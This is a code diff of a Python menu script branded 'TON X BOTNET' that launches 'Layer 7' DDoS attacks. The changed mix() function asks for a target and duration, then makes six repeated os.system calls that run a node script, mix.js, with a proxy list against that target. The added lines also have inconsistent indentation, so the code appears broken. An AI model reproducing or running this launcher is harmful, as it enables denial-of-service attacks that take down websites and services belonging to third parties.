@@ -71,7 +71,9 @@ def help():
 	  BROWSER            VVIP DDOS LAYER 7        COSTUM
 	  KRAKATOA           VVIP DDOS LAYER 7        COSTUM""")
 def mix():
-    print(f"""{birut}
+	targets = input("target : ")
+        time = input("time : ")
+        print(f"""{birut}
                     ,MMM8&&&.
                _...MMMMM88&&&&..._
             .::'''MMMMM88&&&&&&'''::.
@@ -80,14 +82,12 @@ def mix():
               `''''MMMMM88&&&&''''`
                     'MMM8&&&'
       {merah}     welcome to TON X BOTNET""")
-targets = input("target : ")
-time = input("time : ")
-os.system(f"node mix.js {targets} {time} 1000 10000 proxy.txt")
-os.system(f"node mix.js {targets} {time} 1000 10000 proxy.txt")
-os.system(f"node mix.js {targets} {time} 1000 10000 proxy.txt")
-os.system(f"node mix.js {targets} {time} 1000 10000 proxy.txt")
-os.system(f"node mix.js {targets} {time} 1000 10000 proxy.txt")
-os.system(f"node mix.js {targets} {time} 1000 10000 proxy.txt")
+       os.system(f"node mix.js {targets} {time} 1000 10000 proxy.txt")
+       os.system(f"node mix.js {targets} {time} 1000 10000 proxy.txt")
+       os.system(f"node mix.js {targets} {time} 1000 10000 proxy.txt")
+       os.system(f"node mix.js {targets} {time} 1000 10000 proxy.txt")
+       os.system(f"node mix.js {targets} {time} 1000 10000 proxy.txt")
+       os.system(f"node mix.js {targets} {time} 1000 10000 proxy.txt")
 
 def browser():
     host = input("target : ")
